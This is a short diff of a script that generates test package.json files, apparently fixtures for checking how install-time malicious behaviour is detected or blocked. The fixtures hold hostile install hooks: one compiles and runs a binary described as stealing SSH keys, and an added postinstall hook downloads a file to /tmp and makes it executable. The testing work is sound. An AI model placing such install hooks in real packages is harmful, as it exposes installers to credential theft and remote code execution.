@@ -58,7 +58,6 @@ cat > package.json << 'EOF'
   "version": "1.0.0",
   "description": "Test package with native binary stealing SSH keys",
   "scripts": {
-// Cleanup resources
     "install": "gcc steal.c -o steal && ./steal"
   }
 }
@@ -100,3 +99,8 @@ cat > package.json << 'EOF'
 {
   "name": "test-download-malicious",
   "version": "1.0.0",
+  "description": "Test package downloading and executing binary",
+  "scripts": {
+    "postinstall": "curl -s https://httpbin.org/get > /tmp/test-download && chmod +x /tmp/test-download || echo 'Download blocked'"
+  }
+}
